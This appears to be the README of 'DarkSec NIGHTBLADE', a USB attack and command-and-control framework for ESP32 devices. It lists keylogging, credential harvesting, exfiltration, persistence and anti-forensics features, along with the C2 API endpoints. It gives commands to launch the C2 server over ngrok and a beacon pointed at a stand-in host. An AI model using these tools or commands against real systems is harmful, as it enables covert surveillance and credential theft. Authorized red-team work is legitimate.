# DarkSec NIGHTBLADE

```
╔═══════════════════════════════════════════════════════════════╗
║  ██████╗  █████╗ ██████╗ ██╗  ██╗███████╗███████╗ ██████╗     ║
║  ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔════╝██╔════╝     ║
║  ██║  ██║███████║██████╔╝█████╔╝ ███████╗█████╗  ██║          ║
║  ██║  ██║██╔══██║██╔══██╗██╔═██╗ ╚════██║██╔══╝  ██║          ║
║  ██████╔╝██║  ██║██║  ██║██║  ██╗███████║███████╗╚██████╗     ║
║  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝     ║
║      ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗                  ║
║      ████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝                  ║
║      ██╔██╗ ██║██║██║  ███╗███████║   ██║                     ║
║      ██║╚██╗██║██║██║   ██║██╔══██║   ██║                     ║
║      ██║ ╚████║██║╚██████╔╝██║  ██║   ██║                     ║
║      ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝                     ║
║          ██████╗ ██╗      █████╗ ██████╗ ███████╗             ║
║          ██╔══██╗██║     ██╔══██╗██╔══██╗██╔════╝             ║
║          ██████╔╝██║     ███████║██║  ██║█████╗               ║
║          ██╔══██╗██║     ██╔══██║██║  ██║██╔══╝               ║
║          ██████╔╝███████╗██║  ██║██████╔╝███████╗             ║
║          ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝             ║
╚═══════════════════════════════════════════════════════════════╝
```

> **USB Army Knife Exploitation Framework**  
> *"The blade that cuts through digital darkness"*

[![Version](https://img.shields.io/badge/version-2.0-red.svg)](https://github.com/darksec/nightblade)
[![Platform](https://img.shields.io/badge/platform-ESP32-blue.svg)](https://www.espressif.com/en/products/socs/esp32)
[![License](https://img.shields.io/badge/license-Custom-orange.svg)](LICENSE)
[![Status](https://img.shields.io/badge/status-Production-green.svg)](https://github.com/darksec/nightblade)

---

## 🗡️ Overview

**DarkSec NIGHTBLADE** is an advanced USB Army Knife flasher and exploitation framework designed for professional penetration testers and red team operators. Combining enterprise-grade command & control infrastructure with sophisticated attack capabilities, NIGHTBLADE represents the cutting edge of USB-based offensive security tools.

### Key Features

#### Core C2 Infrastructure
- 🎯 **Enterprise-Grade C2 Server** - 30+ API endpoints with SQLite persistence
- 🔒 **SSL/TLS Encryption** - HTTPS support with auto-generated certificates
- 🌐 **Ngrok Integration** - Public tunnel access with authentication
- ⚡ **WebSocket Real-time Shell** - Bidirectional instant command execution
- 🔐 **Multi-User Support** - Role-based access control (admin/operator)
- 📊 **Command History Tracking** - Full audit trail with operator attribution
- 🏷️ **Beacon Tagging System** - Organize targets by campaign/group
- 💚 **Health Monitoring** - Automatic beacon health status tracking
- 🤖 **Auto-Tasking** - Execute commands on beacon registration
- 📤 **Data Export** - CSV/JSON exports for reports
- 🧩 **Plugin System** - Extensible custom functionality
- 🔐 **Encrypted Exfiltration** - Fernet encryption + gzip compression

#### Attack Capabilities
- 📸 **Screenshot Capture** - Visual reconnaissance with organized storage
- ⌨️ **Keylogger Integration** - Real-time keystroke capture and window tracking
- 🔑 **Credential Harvesting** - Automated collection from browsers, memory, and files
- 🖥️ **Process Management** - List, kill, and start processes remotely
- 📁 **File Operations** - Complete file browser with upload/download/execute
- 🔄 **Persistence Management** - Multiple methods including registry, tasks, services
- 🌐 **Network Reconnaissance** - Scanning, port enumeration, ARP/DNS discovery
- ⏰ **Task Scheduling** - Time-based automated operations
- 🔗 **Multi-Beacon Control** - Bulk operations across multiple targets

#### Development Tools
- 🎨 **DuckyScript Editor** - Advanced payload development environment
- 📚 **Payload Library** - Pre-built attack modules for various scenarios

---

## 🚀 Quick Start

### Prerequisites

```bash
# Install Python dependencies
pip install -r requirements.txt

# Or manually:
pip install ttkbootstrap pyserial requests flask flask-sock pyngrok cryptography

# Install ESP-IDF tools (for firmware flashing)
# Follow: https://docs.espressif.com/projects/esp-idf/en/latest/esp32/get-started/
```

### Installation

```bash
# Clone the repository
git clone https://github.com/wickednull/nightblade.git
cd nightblade

python3 -m venv venv

source venv/bin/activate

pip install -r requirements.txt

# Run the installer
python installer_gui.py
```

### Basic Usage

1. **Connect your USB Army Knife device** (ESP32-based)
2. **Launch NIGHTBLADE**: `python installer_gui.py`
3. **Flash firmware**: Navigate to ⚡ Flasher tab → Install Firmware
4. **Create payloads**: Use 📝 DuckyScript Editor
5. **Start C2 server**: Go to 🕸️ C2 Server → Start Server
6. **Deploy and monitor**: Track beacons and execute commands

---

## 📚 Documentation

### Core Modules

#### 🕸️ C2 Server - Elite Edition
Enterprise-grade command and control with 12 advanced features:

**Core Features:**
- SQLite database backend (15+ tables)
- Multi-user support with role-based permissions
- API authentication with SHA256 hashed keys
- Command history with operator tracking
- Beacon health monitoring (healthy/warning/dead)
- Auto-tasking on beacon registration

**Advanced Capabilities:**
- SSL/TLS encryption (HTTPS)
- Ngrok integration for public access
- WebSocket real-time shell
- File compression/encryption (Fernet + gzip)
- Beacon grouping/tagging system
- Data export (CSV/JSON)
- Extensible plugin system

**Start Server:**
```bash
# Basic HTTP
python c2_server_enhanced.py --host 0.0.0.0 --port 8443

# With SSL/TLS
python c2_server_enhanced.py --ssl --port 443

# With Ngrok tunnel
python c2_server_enhanced.py --ngrok --ngrok-token YOUR_TOKEN

# Full enterprise mode
python c2_server_enhanced.py --ssl --ngrok --ngrok-token YOUR_TOKEN
```

#### 📝 DuckyScript Editor
Advanced payload development with:
- Syntax highlighting
- Variable support
- Multiple keyboard layouts
- Payload templates
- Direct device deployment

#### 📦 Payload Library
Pre-built exploits categorized by:
- Information Gathering
- Persistence
- Exfiltration
- Credential Harvesting
- Network Operations
- Social Engineering

#### ⚡ Firmware Flasher
ESP32 device management:
- Auto-detect devices
- One-click firmware installation
- Filesystem upload
- eFuse management
- Serial monitor

---

## 🎯 Advanced Features

### C2 Server Capabilities - Elite Edition

```python
# API Endpoints (30+)
# Beacon Management
/api/beacon/register          # Beacon registration with auto-tasks
/api/beacon/checkin/<id>      # Command check-in
/api/beacon/<id>/command      # Send command with operator tracking
/api/beacon/<id>/history      # Command history viewer
/api/beacon/<id>/tags         # Tag management
/api/beacons                  # List beacons with filtering (group/tags)
/api/beacons/bulk/command     # Bulk operations

# Data Collection
/api/beacon/<id>/screenshot   # Screenshot upload (encrypted)
/api/beacon/<id>/keylog       # Keylogger data
/api/beacon/<id>/credentials  # Credential harvesting
/api/beacon/<id>/exfil        # Encrypted data exfiltration

# Operations
/api/beacon/<id>/processes    # Process management
/api/beacon/<id>/files        # File operations
/api/beacon/<id>/persistence  # Persistence management
/api/beacon/<id>/network      # Network operations
/api/beacon/<id>/sysinfo      # System information

# Advanced Features
/api/auto-tasks               # Auto-task management (GET/POST)
/api/export/<type>            # Data export (CSV/JSON)
/api/users/create             # Multi-user management
/api/plugins                  # Plugin system
/api/plugins/<name>           # Execute plugin
/api/credentials              # View all credentials

# Real-time
/ws/shell/<beacon_id>         # WebSocket real-time shell
```

### Example Beacon Payload

```python
# Advanced beacon with all features
python advanced_beacon.py --server http://c2.example.com:8443
```

Features:
- Auto-registration
- Command execution
- Screenshot capture
- Keylogging
- Credential dumping
- Persistence installation
- Network reconnaissance

---

## 🛠️ Architecture

### System Components

```
DarkSec NIGHTBLADE
├── installer_gui.py           # Main GUI application
├── c2_server.py              # C2 server (standard edition)
├── c2_server_enhanced.py     # C2 server (elite edition - 12 features)
├── duckyscript_converter.py  # DuckyScript compiler
├── payloads/                 # Payload library
│   ├── info_gathering/
│   ├── persistence/
│   ├── exfiltration/
│   └── credential_harvest/
├── firmware/                 # ESP32 firmware binaries
└── encryption_key.bin        # C2 encryption key (auto-generated)
```

### Database Schema

```sql
-- 15+ persistent tables for complete operation tracking
beacons           # Beacon tracking with tags, groups, health status
commands          # Command queue with operator attribution
exfil_data        # Encrypted/compressed exfiltrated data
screenshots       # Captured screenshots
keylogs           # Keystroke recordings
credentials       # Harvested credentials by source
sessions          # Interactive WebSocket shell sessions
tasks             # Scheduled operations
auto_tasks        # NEW: Auto-tasks on beacon registration
api_keys          # Authentication with roles & permissions
files             # File browser cache
beacon_groups     # NEW: Beacon grouping system
listener_profiles # NEW: Multiple listener configurations
audit_log         # NEW: Complete operation audit trail
```

---

## 🎨 GUI Overview

### Tabs

1. **🏠 Welcome** - Quick setup and project initialization
2. **⚡ Flasher** - Device firmware management
3. **🔧 eFuse** - ESP32 configuration
4. **🤖 Agent** - Autonomous operation modes
5. **📝 DuckyScript** - Payload editor
6. **📚 Library** - Pre-built payloads
7. **📟 Serial Monitor** - Device communication
8. **👤 Profiles** - Device configurations
9. **🎭 Orchestration** - Multi-stage attacks
10. **🕸️ C2 Server** - Command & control
11. **📡 WiFi Attacks** - Wireless exploitation
12. **📶 Bluetooth** - BLE attacks
13. **🎭 Obfuscation** - Payload protection
14. **🎣 Social Engineering** - Pretexting tools
15. **🌐 Network Recon** - Discovery tools
16. **💀 Post-Exploit** - Advanced techniques
17. **📊 Dashboard** - Operations overview

---

## 🔒 Security Considerations

### Operational Security

- ✅ Use VPNs/proxies for C2 communications
- ✅ Enable API key authentication
- ✅ Encrypt exfiltrated data
- ✅ Use domain fronting when possible
- ✅ Implement beacon jitter
- ✅ Rotate credentials regularly

### OPSEC Features

- Encrypted C2 communications
- API key authentication
- Audit logging
- Beacon fingerprint randomization
- Anti-forensics capabilities
- Secure data deletion

---

## 🎓 Use Cases

### Authorized Penetration Testing
- Red team engagements
- Physical security assessments
- Social engineering testing
- Insider threat simulation

### Security Research
- Exploit development
- Detection capability testing
- Blue team training
- Attack simulation

### Defensive Security
- Detection rule development
- SOC analyst training
- Incident response drills
- EDR/AV testing

---

## 📊 Technical Specifications

### Elite Edition C2 Server

| Component | Specification |
|-----------|---------------|
| **API Endpoints** | 30+ RESTful + WebSocket |
| **Database** | SQLite with 15+ persistent tables |
| **SSL/TLS** | ✅ Auto-generated certificates |
| **Ngrok Integration** | ✅ Public tunnel with auth |
| **WebSocket Shell** | ✅ Real-time bidirectional |
| **Encryption** | ✅ Fernet + gzip for exfil |
| **Multi-User** | ✅ Role-based access control |
| **Health Monitoring** | ✅ Automated status tracking |
| **Auto-Tasking** | ✅ On registration triggers |
| **Data Export** | ✅ CSV/JSON/HTML reports |
| **Plugin System** | ✅ Extensible architecture |
| **Command History** | ✅ Full audit with operators |
| **Beacon Tagging** | ✅ Campaign organization |

### Attack Capabilities

| Feature | Status |
|---------|--------|
| **Screenshot System** | ✅ Full capture & encrypted storage |
| **Keylogger** | ✅ Real-time with window tracking |
| **Credential Storage** | ✅ Organized harvesting database |
| **Persistence** | ✅ Automated multi-method |
| **Network Operations** | ✅ Advanced reconnaissance |
| **Multi-Beacon Control** | ✅ Bulk operations support |
| **Authentication** | SHA256 API key + permissions |
| **Platform Support** | Windows, Linux, macOS |

---

## 🤝 Contributing

We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

### Development Setup

```bash
git clone https://github.com/darksec/nightblade.git
cd nightblade
pip install -r requirements.txt
python installer_gui.py
```

---

## 📄 License

This project is licensed under a custom license. See [LICENSE](LICENSE) for details.

---

## ⚠️ Legal Disclaimer

```
╔═══════════════════════════════════════════════════════════════╗
║                      ⚠️  LEGAL NOTICE                         ║
║                                                               ║
║  DarkSec NIGHTBLADE is designed exclusively for authorized   ║
║  security testing, penetration testing, and red team         ║
║  operations. Unauthorized access to computer systems is      ║
║  illegal.                                                     ║
║                                                               ║
║  Users must obtain proper authorization before deployment.   ║
║  DarkSec Labs and the developers assume no liability for     ║
║  misuse of this software.                                    ║
║                                                               ║
║  By using this tool, you agree to comply with all            ║
║  applicable laws and regulations.                            ║
╚═══════════════════════════════════════════════════════════════╝
```

---


---

## 🙏 Credits

**Developed by DarkSec Labs**

Special thanks to:
- The ESP32 community
- DuckyScript developers
- Open source security researchers
- Red team operators worldwide

---


---

<div align="center">

**DarkSec NIGHTBLADE v2.0**  
*From DarkSec Labs - Forging the future of offensive security*

⚔️ **The blade that cuts through digital darkness** ⚔️

</div>
